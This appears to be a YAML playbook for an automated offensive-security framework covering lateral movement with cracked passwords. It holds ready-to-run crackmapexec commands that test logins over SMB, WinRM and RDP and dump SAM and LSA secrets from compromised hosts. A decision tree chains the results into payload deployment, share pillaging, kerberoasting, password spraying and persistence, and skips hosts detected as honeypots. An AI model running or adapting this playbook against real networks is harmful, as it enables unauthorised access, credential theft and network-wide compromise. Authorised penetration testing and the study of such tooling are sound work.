id: credential_testing
name: "Test Cracked Credentials"
category: lateral_movement
description: "Test cracked credentials against various services to establish access"
estimated_duration: "15m"
risk_level: medium
stealth_level: moderate

# Triggered when credentials are available for testing
triggers:
  - type: asset_discovered
    conditions:
      asset_type: "credential"
      properties:
        verified: false
        from_hash: true
    priority: 10
    description: "Test unverified cracked credentials"

  - type: custom_condition
    conditions:
      field: "cracked_credentials.length"
      operator: "greater_than"
      value: 0
    priority: 10
    description: "Test newly cracked credentials"

steps:
  - id: test_smb_access
    name: "Test SMB Access"
    type: command
    description: "Test credentials against SMB services"
    order: 1
    command: "crackmapexec smb {target_hosts} -u '{username}' -p '{password}' --continue-on-success"
    command_variants:
      - condition: "domain != null"
        command: "crackmapexec smb {target_hosts} -d '{domain}' -u '{username}' -p '{password}' --continue-on-success --shares"
        description: "Domain authentication with share enumeration"
    timeout: "5m"
    expected_outputs:
      - type: text
        parser: crackmapexec
        success_indicators: ["[+]", "Pwn3d!", "(admin)"]
        failure_indicators: ["[-]", "STATUS_LOGON_FAILURE"]
    asset_discovery:
      search_patterns:
        - pattern: "\\[\\+\\].*Pwn3d!"
          asset_type: "access"
          confidence: 1.0
          metadata:
            access_level: "administrator"
            service: "smb"

  - id: test_rdp_access
    name: "Test RDP Access"
    type: command
    description: "Test credentials against RDP services"
    order: 2
    command: "rdp_check.py {target_hosts} '{domain}\\{username}' '{password}'"
    timeout: "5m"
    expected_outputs:
      - type: text
        parser: generic
        success_indicators: ["Success", "RDP enabled"]

  - id: test_winrm_access
    name: "Test WinRM Access"
    type: command
    description: "Test credentials against WinRM for remote management"
    order: 3
    command: "crackmapexec winrm {target_hosts} -u '{username}' -p '{password}'"
    timeout: "5m"
    expected_outputs:
      - type: text
        parser: crackmapexec
        success_indicators: ["[+]", "Pwn3d!"]

  - id: enumerate_access_level
    name: "Enumerate Access Level"
    type: command
    description: "Determine exact privileges for successful authentications"
    order: 4
    command: "crackmapexec smb {admin_access_hosts} -u '{username}' -p '{password}' --sam --lsa"
    timeout: "5m"
    expected_outputs:
      - type: text
        parser: crackmapexec

# Critical outcomes determining next actions
outcome_schema:
  admin_access:
    type: object
    description: "Hosts where we have admin access"
    properties:
      host: string
      user: string
    critical: true
    triggers: "deploy_payload"
  read_access:
    type: object
    description: "Hosts with read-only access"
    properties:
      host: string
      shares: array
  no_access:
    type: array
    items: string
    description: "Hosts where credentials failed"
  user_workstation:
    type: object
    properties:
      user: string
      workstation: string
    description: "Identified user workstations"
  valid_credentials:
    type: array
    items:
      type: object
      properties:
        domain: string
        username: string
        password: string
        verified: boolean
        access_level: string

# Critical decision tree based on access levels
next_methodologies:
  - methodology: "deploy_payload"
    condition: "admin_access != null AND Object.keys(admin_access).length > 0"
    description: "Deploy payload on systems with admin access"
    priority: 10
    context_mapping:
      target_host: "{admin_access.host}"
      credentials: "{valid_credentials[0]}"

  - methodology: "share_pillaging"
    condition: "read_access != null AND read_access.shares.length > 0"
    description: "Search accessible shares for sensitive data"
    priority: 8
    context_mapping:
      accessible_shares: "{read_access}"

  - methodology: "kerberoasting"
    condition: "valid_credentials.length > 0 AND admin_access == null"
    description: "Try Kerberoasting if no admin access"
    priority: 7
    context_mapping:
      domain_creds: "{valid_credentials[0]}"

  - methodology: "bloodhound_collection"
    condition: "valid_credentials.length > 0 AND domain != null"
    description: "Run BloodHound to find attack paths"
    priority: 9
    context_mapping:
      collection_method: "remote"
      credentials: "{valid_credentials[0]}"

  - methodology: "password_spraying"
    condition: "valid_credentials.length > 0 AND no_access.length > 5"
    description: "Try password spraying with known good passwords"
    priority: 6
    context_mapping:
      passwords: "{valid_credentials.map(c => c.password)}"
      target_hosts: "{no_access}"

# Key decision points
decision_points:
  - condition: "admin_access.host == domain_controller"
    action: "critical_alert"
    reason: "Domain Controller access achieved!"

  - condition: "valid_credentials.filter(c => c.access_level == 'administrator').length > 3"
    action: "establish_persistence"
    reason: "Multiple admin accounts compromised"

  - condition: "no_access.length == target_hosts.length"
    action: "mark_credentials_invalid"
    reason: "Credentials don't work on any target"

suppression:
  available_scopes:
    - scope: "host"
      description: "Skip testing on specific hosts"
      conditions: ["Honeypot detected", "Out of scope"]

deduplication:
  strategy: "signature_based"
  signature_fields: ["credential_hash", "target_network"]
  cooldown_period: "30m"